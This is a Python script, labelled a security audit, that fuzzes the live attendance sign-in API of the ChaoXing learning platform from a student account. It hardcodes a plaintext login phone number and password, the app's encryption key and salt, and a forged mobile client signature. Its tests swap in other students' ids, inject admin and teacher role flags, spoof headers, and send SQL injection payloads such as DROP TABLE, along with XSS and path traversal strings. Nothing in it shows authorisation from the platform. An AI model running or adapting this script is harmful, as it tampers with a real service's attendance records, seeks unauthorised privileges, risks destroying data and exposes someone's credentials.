#!/usr/bin/env python3
"""
Comprehensive parameter combination testing on /newsign/updateSignStatus API
Security audit for ChaoXing (超星学习通) platform - student account perspective.
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"

# ============ Login helpers ============

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

# ============ API helpers ============

COURSE_ID = "257485372"
CLASS_ID = "132821141"
STUDENT_UID = "431407443"
CPI = "520211407"

API_URL = f"{BASE}/newsign/updateSignStatus"

def fetch_activity_list(session):
    """获取课程活动列表 - 尝试多种API端点"""
    activities = []

    # 方法1: taskactivelist
    endpoints_to_try = [
        (f"{BASE}/newsign/taskactivelist", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_UID}),
        (f"{BASE}/newsign/taskactivelist", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_UID, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "courseId"}),
    ]

    for url, params in endpoints_to_try:
        try:
            r = session.get(url, params=params, timeout=30)
            if r.status_code == 200:
                data = r.json()
                active_list = None
                if isinstance(data, dict):
                    active_list = data.get("activeList") or data.get("data") or data.get("list")
                elif isinstance(data, list):
                    active_list = data
                if active_list:
                    for act in active_list:
                        aid = act.get("activeId") or act.get("id") or act.get("aid")
                        atype = act.get("activeType") or act.get("type") or act.get("name", "unknown")
                        if aid:
                            activities.append({"activeId": str(aid), "type": str(atype)})
                    if activities:
                        return activities
        except Exception:
            pass

    # 方法2: backclazzdata
    try:
        url = f"https://mooc1-api.chaoxing.com/mycourse/backclazzdata"
        r = session.get(url, params={"clazzid": CLASS_ID, "courseid": COURSE_ID, "uid": STUDENT_UID}, timeout=30)
        if r.status_code == 200:
            data = r.json()
            # 递归查找activeId
            def find_activities(obj, depth=0):
                if depth > 8:
                    return
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if k == "activeId" and isinstance(v, (int, str)) and str(v) != "0":
                            atype = obj.get("activeType", obj.get("type", "unknown"))
                            activities.append({"activeId": str(v), "type": str(atype)})
                        elif isinstance(v, (dict, list)):
                            find_activities(v, depth+1)
                elif isinstance(obj, list):
                    for item in obj:
                        find_activities(item, depth+1)
            find_activities(data)
    except Exception:
        pass

    return activities

def do_request(session, method, url, params=None, data=None, json_data=None, headers=None, content_type=None):
    """执行请求并记录结果"""
    req_headers = dict(session.headers)
    if headers:
        req_headers.update(headers)
    if content_type:
        req_headers["Content-Type"] = content_type

    try:
        if method == "GET":
            r = session.get(url, params=params, headers=req_headers, timeout=30)
        elif method == "POST":
            if content_type == "application/json":
                r = session.post(url, params=params, json=json_data, headers=req_headers, timeout=30)
            elif content_type == "multipart/form-data":
                h2 = dict(req_headers)
                h2.pop("Content-Type", None)
                r = session.post(url, params=params, data=data, headers=h2, timeout=30)
            else:
                r = session.post(url, params=params, data=data, headers=req_headers, timeout=30)
        elif method == "PUT":
            if content_type == "application/json":
                r = session.put(url, params=params, json=json_data, headers=req_headers, timeout=30)
            else:
                r = session.put(url, params=params, data=data, headers=req_headers, timeout=30)
        elif method == "DELETE":
            r = session.delete(url, params=params, headers=req_headers, timeout=30)
        elif method == "PATCH":
            if content_type == "application/json":
                r = session.patch(url, params=params, json=json_data, headers=req_headers, timeout=30)
            else:
                r = session.patch(url, params=params, data=data, headers=req_headers, timeout=30)
        else:
            return {"error": f"Unsupported method: {method}"}

        resp_text = r.text[:300] if r.text else ""
        return {
            "status_code": r.status_code,
            "response": resp_text,
        }
    except Exception as e:
        return {"error": str(e), "status_code": None, "response": ""}

def build_base_params(active_id, uid=STUDENT_UID):
    """构建基础参数"""
    return {
        "activeId": active_id,
        "classId": CLASS_ID,
        "courseId": COURSE_ID,
        "uid": uid,
        "uids": uid,
        "status": "0",
        "remark": "",
    }

def record_result(results, test_num, category, method, url_params, form_data, content_type, resp, default_response, extra=None):
    """记录测试结果"""
    diff = resp.get("response", "") != default_response
    entry = {
        "test_id": test_num,
        "category": category,
        "method": method,
        "url_params": url_params,
        "form_data": form_data,
        "content_type": content_type,
        **resp,
        "differs_from_default": diff,
    }
    if extra:
        entry.update(extra)
    results.append(entry)
    return diff

# ============ Test functions ============

def run_all_tests(session, activities):
    results = []
    default_response = None

    # 如果没有活动，使用一组测试activeId
    if not activities:
        print("[!] 未获取到活动列表，使用测试activeId集合")
        # 使用一组可能的activeId进行测试
        activities = [
            {"activeId": "1", "type": "test_placeholder_1"},
            {"activeId": "100", "type": "test_placeholder_100"},
            {"activeId": "1000", "type": "test_placeholder_1000"},
        ]

    primary_aid = activities[0]["activeId"]
    print(f"[*] 主测试活动ID: {primary_aid}")

    # 先获取默认响应（标准POST请求）
    base_p = build_base_params(primary_aid)
    default_r = do_request(session, "POST", API_URL,
                           params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid},
                           data=base_p,
                           content_type="application/x-www-form-urlencoded")
    default_response = default_r.get("response", "")
    print(f"[*] 默认响应: {default_response[:200]}")

    test_num = 0

    # ========== 1. 不同 DB_STRATEGY 值 ==========
    print("\n[1] 测试不同 DB_STRATEGY 值")
    db_strategies = ["PRIMARY_KEY", "COURSEID", "CLASSID", "ACTIVEID", "NONE", "", "RANDOM", "SLAVE"]
    for ds in db_strategies:
        test_num += 1
        params_url = {"DB_STRATEGY": ds, "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=base_p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "DB_STRATEGY", "POST", params_url, base_p,
                           "application/x-www-form-urlencoded", r, default_response)
        print(f"  [{test_num}] DB_STRATEGY={ds!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 2. 不同 STRATEGY_PARA 值 ==========
    print("\n[2] 测试不同 STRATEGY_PARA 值")
    strategy_paras = ["activeId", "courseId", "classId", "uid"]
    for sp in strategy_paras:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": sp, "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=base_p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "STRATEGY_PARA", "POST", params_url, base_p,
                           "application/x-www-form-urlencoded", r, default_response)
        print(f"  [{test_num}] STRATEGY_PARA={sp!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 3. 不同 HTTP 方法 ==========
    print("\n[3] 测试不同 HTTP 方法")
    methods = ["POST", "GET", "PUT", "DELETE", "PATCH"]
    for m in methods:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        if m == "GET":
            get_params = dict(params_url)
            get_params.update(base_p)
            r = do_request(session, m, API_URL, params=get_params, content_type=None)
        elif m in ("DELETE",):
            r = do_request(session, m, API_URL, params=params_url, content_type=None)
        else:
            r = do_request(session, m, API_URL, params=params_url, data=base_p,
                           content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "HTTP_METHOD", m, params_url,
                           base_p if m not in ("GET", "DELETE") else None,
                           "application/x-www-form-urlencoded" if m not in ("GET", "DELETE") else None,
                           r, default_response)
        print(f"  [{test_num}] METHOD={m} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 4. 不同 Content-Type ==========
    print("\n[4] 测试不同 Content-Type")
    content_types = ["application/x-www-form-urlencoded", "multipart/form-data", "application/json",
                     "text/plain", "text/xml"]
    for ct in content_types:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        if ct == "application/json":
            r = do_request(session, "POST", API_URL, params=params_url, json_data=base_p, content_type=ct)
        else:
            r = do_request(session, "POST", API_URL, params=params_url, data=base_p, content_type=ct)
        diff = record_result(results, test_num, "CONTENT_TYPE", "POST", params_url, base_p, ct, r, default_response)
        print(f"  [{test_num}] Content-Type={ct!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 5. 不同 status 值 ==========
    print("\n[5] 测试不同 status 值")
    status_values = ["0", "1", "2", "3", "4", "5", "6", "-1", "99", "999", "-999", "abc", "1.5", "null", "undefined"]
    for st in status_values:
        test_num += 1
        p = dict(base_p)
        p["status"] = st
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "STATUS_VALUE", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response)
        print(f"  [{test_num}] status={st!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 6. 不同 uids 格式 ==========
    print("\n[6] 测试不同 uids 格式")
    uid_formats = [
        ("single_uid", STUDENT_UID),
        ("comma_separated", f"{STUDENT_UID},999999999"),
        ("comma_many", f"{STUDENT_UID},999999998,999999997,999999996"),
        ("json_array", '["' + STUDENT_UID + '"]'),
        ("json_array_multi", '["' + STUDENT_UID + '","999999999"]'),
        ("bracket_format", "[" + STUDENT_UID + "]"),
        ("empty_uids", ""),
        ("space_uids", " "),
        ("null_uids", "null"),
        ("sql_injection", "1 OR 1=1"),
        ("xss_payload", "<script>alert(1)</script>"),
    ]
    for label, uid_val in uid_formats:
        test_num += 1
        p = dict(base_p)
        p["uids"] = uid_val
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "UIDS_FORMAT", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"uids_label": label})
        print(f"  [{test_num}] uids_format={label!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 7. 额外参数注入 ==========
    print("\n[7] 测试额外参数注入")
    extra_params = {
        "operateSource": "1",
        "sourceType": "1",
        "roletype": "1",
        "role": "1",
        "cpi": CPI,
        "token": "test_token",
        "signType": "1",
        "fromSource": "1",
        "isStu": "1",
        "studentId": STUDENT_UID,
        "stuId": STUDENT_UID,
        "JSESSIONID": "injected_session",
        "admin": "true",
        "isAdmin": "1",
        "isTeacher": "1",
        "authority": "admin",
        "permission": "all",
    }
    for key, val in extra_params.items():
        test_num += 1
        p = dict(base_p)
        p[key] = val
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "EXTRA_PARAM_INJECTION", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"injected_param": key})
        print(f"  [{test_num}] extra={key}={val!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 8. 不同活动类型 ==========
    print("\n[8] 测试不同活动类型（不同activeId）")
    # 使用从API获取的活动 + 额外的测试ID
    test_aids = list(activities[:5])
    # 添加一些额外的测试activeId
    extra_aids = [
        {"activeId": "0", "type": "zero"},
        {"activeId": "-1", "type": "negative"},
        {"activeId": "999999999", "type": "large_nonexistent"},
        {"activeId": "1", "type": "minimal"},
        {"activeId": "abc", "type": "non_numeric"},
    ]
    for ea in extra_aids:
        if not any(a["activeId"] == ea["activeId"] for a in test_aids):
            test_aids.append(ea)

    for act in test_aids[:8]:
        test_num += 1
        aid = act["activeId"]
        atype = act["type"]
        p = build_base_params(aid)
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "DIFFERENT_ACTIVITY", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"activity_info": act})
        print(f"  [{test_num}] activity={aid} (type={atype}) => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 9. uid 参数替换 ==========
    print("\n[9] 测试 uid 参数替换")
    uid_substitutions = [
        ("teacher_uid", "0"),
        ("empty_uid", ""),
        ("different_student", "999999999"),
        ("uid_as_teacher_uid", "1"),
        ("uid_negative", "-1"),
        ("uid_very_large", "999999999999"),
        ("uid_non_numeric", "abc"),
        ("uid_sql_injection", "1 OR 1=1"),
        ("uid_xss", "<script>alert(1)</script>"),
        ("uid_same_as_courseid", COURSE_ID),
        ("uid_same_as_classid", CLASS_ID),
    ]
    for label, uid_val in uid_substitutions:
        test_num += 1
        p = dict(base_p)
        p["uid"] = uid_val
        p["uids"] = uid_val if uid_val else STUDENT_UID
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "UID_SUBSTITUTION", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"uid_label": label})
        print(f"  [{test_num}] uid_sub={label!r} uid={uid_val!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 10. 不带 DB_STRATEGY 参数 ==========
    print("\n[10] 测试不带 DB_STRATEGY 参数")
    no_db_tests = [
        ("NO_DB_STRATEGY", {"activeId": primary_aid}),
        ("NO_URL_PARAMS", {}),
        ("NO_STRATEGY_PARA", {"DB_STRATEGY": "PRIMARY_KEY", "activeId": primary_aid}),
        ("ONLY_ACTIVEID_IN_URL", {"activeId": primary_aid}),
        ("DB_STRATEGY_EMPTY_STR", {"DB_STRATEGY": "", "STRATEGY_PARA": "", "activeId": primary_aid}),
    ]
    for label, params_url in no_db_tests:
        test_num += 1
        p = dict(base_p)
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, label, "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response)
        print(f"  [{test_num}] {label} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 额外测试: 参数在URL vs Body中的位置 ==========
    print("\n[11] 测试参数位置（URL vs Body）")
    # 所有参数放URL
    test_num += 1
    all_in_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}
    all_in_url.update(base_p)
    r = do_request(session, "GET", API_URL, params=all_in_url, content_type=None)
    diff = record_result(results, test_num, "PARAM_LOCATION_ALL_URL", "GET", all_in_url, None, None, r, default_response)
    print(f"  [{test_num}] all_in_url => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
    time.sleep(0.2)

    # 所有参数放Body（POST无URL参数）
    test_num += 1
    p = dict(base_p)
    p["DB_STRATEGY"] = "PRIMARY_KEY"
    p["STRATEGY_PARA"] = "activeId"
    r = do_request(session, "POST", API_URL, params={}, data=p,
                   content_type="application/x-www-form-urlencoded")
    diff = record_result(results, test_num, "PARAM_LOCATION_ALL_BODY", "POST", {}, p,
                       "application/x-www-form-urlencoded", r, default_response)
    print(f"  [{test_num}] all_in_body => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
    time.sleep(0.2)

    # ========== 额外测试: 缺失关键参数 ==========
    print("\n[12] 测试缺失关键参数")
    missing_param_tests = [
        ("MISSING_ACTIVEID", {k: v for k, v in base_p.items() if k != "activeId"}),
        ("MISSING_CLASSID", {k: v for k, v in base_p.items() if k != "classId"}),
        ("MISSING_COURSEID", {k: v for k, v in base_p.items() if k != "courseId"}),
        ("MISSING_UID", {k: v for k, v in base_p.items() if k != "uid"}),
        ("MISSING_UIDS", {k: v for k, v in base_p.items() if k != "uids"}),
        ("MISSING_STATUS", {k: v for k, v in base_p.items() if k != "status"}),
        ("MISSING_ALL_OPTIONAL", {"activeId": primary_aid}),  # 只保留activeId
        ("EMPTY_BODY", {}),
    ]
    for label, p in missing_param_tests:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, label, "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response)
        print(f"  [{test_num}] {label} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 额外测试: SQL注入和特殊字符 ==========
    print("\n[13] 测试SQL注入和特殊字符")
    injection_tests = [
        ("activeId_sqli", "activeId", "1' OR '1'='1"),
        ("activeId_sqli2", "activeId", "1; DROP TABLE users--"),
        ("activeId_sqli3", "activeId", "1 UNION SELECT * FROM users"),
        ("courseId_sqli", "courseId", "257485372' OR '1'='1"),
        ("classId_sqli", "classId", "132821141' OR '1'='1"),
        ("remark_sqli", "remark", "'; DROP TABLE sign;--"),
        ("remark_xss", "remark", "<script>document.cookie</script>"),
        ("activeId_path_traversal", "activeId", "../../../etc/passwd"),
        ("activeId_format_string", "activeId", "%s%s%s%s%s"),
        ("activeId_null_byte", "activeId", "1%00"),
        ("activeId_unicode", "activeId", "1\u0000"),
        ("activeId_very_long", "activeId", "A" * 1000),
    ]
    for label, param_name, param_val in injection_tests:
        test_num += 1
        p = dict(base_p)
        p[param_name] = param_val
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "INJECTION_TEST", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"injection_label": label, "injected_param": param_name})
        print(f"  [{test_num}] {label} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 额外测试: 不同activeId在URL参数中 ==========
    print("\n[14] 测试URL参数中activeId与Body中不同")
    mismatch_tests = [
        ("URL_AID_DIFF_BODY_AID", "999999", primary_aid),
        ("URL_AID_EMPTY_BODY_HAS", "", primary_aid),
        ("URL_AID_HAS_BODY_EMPTY", primary_aid, ""),
        ("URL_AID_NEGATIVE_BODY_NORMAL", "-1", primary_aid),
    ]
    for label, url_aid, body_aid in mismatch_tests:
        test_num += 1
        p = dict(base_p)
        p["activeId"] = body_aid
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": url_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=p,
                       content_type="application/x-www-form-urlencoded")
        diff = record_result(results, test_num, "AID_MISMATCH", "POST", params_url, p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"url_activeId": url_aid, "body_activeId": body_aid})
        print(f"  [{test_num}] {label} url_aid={url_aid!r} body_aid={body_aid!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 额外测试: 重复参数 ==========
    print("\n[15] 测试重复参数（参数覆盖）")
    # 在URL和Body中同时放相同参数
    test_num += 1
    p = dict(base_p)
    params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid,
                  "uid": "999999999", "status": "99"}  # URL中不同的uid和status
    r = do_request(session, "POST", API_URL, params=params_url, data=p,
                   content_type="application/x-www-form-urlencoded")
    diff = record_result(results, test_num, "DUPLICATE_PARAMS_URL_BODY", "POST", params_url, p,
                       "application/x-www-form-urlencoded", r, default_response)
    print(f"  [{test_num}] duplicate_params => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
    time.sleep(0.2)

    # ========== 额外测试: 自定义Header注入 ==========
    print("\n[16] 测试自定义Header注入")
    header_tests = [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Original-URL", "/newsign/updateSignStatus"),
        ("X-Rewrite-URL", "/newsign/updateSignStatus"),
        ("Referer", "https://mooc1.chaoxing.com/"),
        ("Origin", "https://mooc1.chaoxing.com"),
        ("Cookie", "admin=true"),
        ("Authorization", "Bearer test_token"),
    ]
    for header_name, header_val in header_tests:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, data=base_p,
                       content_type="application/x-www-form-urlencoded",
                       headers={header_name: header_val})
        diff = record_result(results, test_num, "HEADER_INJECTION", "POST", params_url, base_p,
                           "application/x-www-form-urlencoded", r, default_response,
                           extra={"injected_header": header_name, "header_value": header_val})
        print(f"  [{test_num}] Header {header_name}={header_val!r} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    # ========== 额外测试: JSON Body中的特殊结构 ==========
    print("\n[17] 测试JSON Body特殊结构")
    json_tests = [
        ("nested_json", {"activeId": primary_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                         "uid": STUDENT_UID, "uids": STUDENT_UID, "status": "0",
                         "extra": {"role": "admin", "authority": "all"}}),
        ("json_with_array_uids", {"activeId": primary_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                  "uid": STUDENT_UID, "uids": [STUDENT_UID, "999999999"], "status": "0"}),
        ("json_with_null_values", {"activeId": primary_aid, "classId": None, "courseId": COURSE_ID,
                                   "uid": STUDENT_UID, "uids": STUDENT_UID, "status": None}),
        ("json_with_bool_values", {"activeId": primary_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                   "uid": STUDENT_UID, "uids": STUDENT_UID, "status": True,
                                   "isAdmin": True}),
    ]
    for label, json_data in json_tests:
        test_num += 1
        params_url = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": primary_aid}
        r = do_request(session, "POST", API_URL, params=params_url, json_data=json_data,
                       content_type="application/json")
        diff = record_result(results, test_num, "JSON_BODY_SPECIAL", "POST", params_url, json_data,
                           "application/json", r, default_response,
                           extra={"json_label": label})
        print(f"  [{test_num}] {label} => {r.get('status_code')} | diff={diff} | {r.get('response','')[:100]}")
        time.sleep(0.2)

    return results, default_response


def main():
    print("=" * 70)
    print("超星学习通 /newsign/updateSignStatus API 参数组合安全测试")
    print("=" * 70)

    # 登录
    print("\n[*] 正在登录学生账号...")
    session, puid = login("18436633997", "3.1415926Cpy")
    if not puid:
        for c in session.cookies:
            if c.name in ("UID", "_uid"):
                puid = c.value
    print(f"[*] 登录完成, puid={puid}")

    if not puid:
        print("[!] 登录失败，无法获取puid")
        sys.exit(1)

    # 获取活动列表
    print("\n[*] 正在获取课程活动列表...")
    activities = fetch_activity_list(session)
    print(f"[*] 获取到 {len(activities)} 个活动")
    for a in activities[:5]:
        print(f"    - activeId={a['activeId']}, type={a['type']}")

    # 运行所有测试
    print("\n[*] 开始参数组合测试...")
    results, default_resp = run_all_tests(session, activities)

    # 保存结果
    output = {
        "meta": {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "student_uid": STUDENT_UID,
            "course_id": COURSE_ID,
            "class_id": CLASS_ID,
            "total_tests": len(results),
            "default_response": default_resp,
            "activities_found": activities,
        },
        "results": results,
    }

    with open("/workspace/task1_results.json", "w", encoding="utf-8") as f:
        json.dump(output, f, ensure_ascii=False, indent=2)

    print(f"\n[*] 结果已保存到 /workspace/task1_results.json")
    print(f"[*] 共执行 {len(results)} 个测试")

    # 汇总有差异的发现
    interesting = [r for r in results if r.get("differs_from_default")]
    print(f"\n{'=' * 70}")
    print(f"有趣发现汇总（与默认响应不同的测试）: {len(interesting)} 个")
    print(f"{'=' * 70}")
    for r in interesting:
        print(f"\n  测试 #{r['test_id']} [{r['category']}]")
        print(f"    方法: {r.get('method')}")
        print(f"    URL参数: {json.dumps(r.get('url_params', {}), ensure_ascii=False)}")
        if r.get('form_data'):
            fd = r.get('form_data')
            if isinstance(fd, dict):
                print(f"    表单数据: {json.dumps(fd, ensure_ascii=False)}")
            else:
                print(f"    表单数据: {fd}")
        print(f"    Content-Type: {r.get('content_type')}")
        print(f"    状态码: {r.get('status_code')}")
        print(f"    响应: {r.get('response', '')[:200]}")

    if not interesting:
        print("\n  所有测试响应均与默认响应相同，未发现参数差异。")

    # 额外：列出所有非200状态码的测试
    non_200 = [r for r in results if r.get("status_code") and r["status_code"] != 200]
    if non_200:
        print(f"\n非200状态码测试: {len(non_200)} 个")
        for r in non_200:
            print(f"  测试 #{r['test_id']} [{r['category']}] => HTTP {r['status_code']}")

    # 列出包含错误信息的测试
    errors = [r for r in results if r.get("error")]
    if errors:
        print(f"\n请求错误: {len(errors)} 个")
        for r in errors:
            print(f"  测试 #{r['test_id']} [{r['category']}] => {r['error']}")

    # 按类别统计
    print(f"\n{'=' * 70}")
    print("按类别统计:")
    print(f"{'=' * 70}")
    categories = {}
    for r in results:
        cat = r.get("category", "UNKNOWN")
        if cat not in categories:
            categories[cat] = {"total": 0, "diff": 0, "non_200": 0}
        categories[cat]["total"] += 1
        if r.get("differs_from_default"):
            categories[cat]["diff"] += 1
        if r.get("status_code") and r["status_code"] != 200:
            categories[cat]["non_200"] += 1

    for cat, stats in sorted(categories.items()):
        print(f"  {cat}: 总计={stats['total']}, 有差异={stats['diff']}, 非200={stats['non_200']}")

    print(f"\n{'=' * 70}")
    print("测试完成!")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
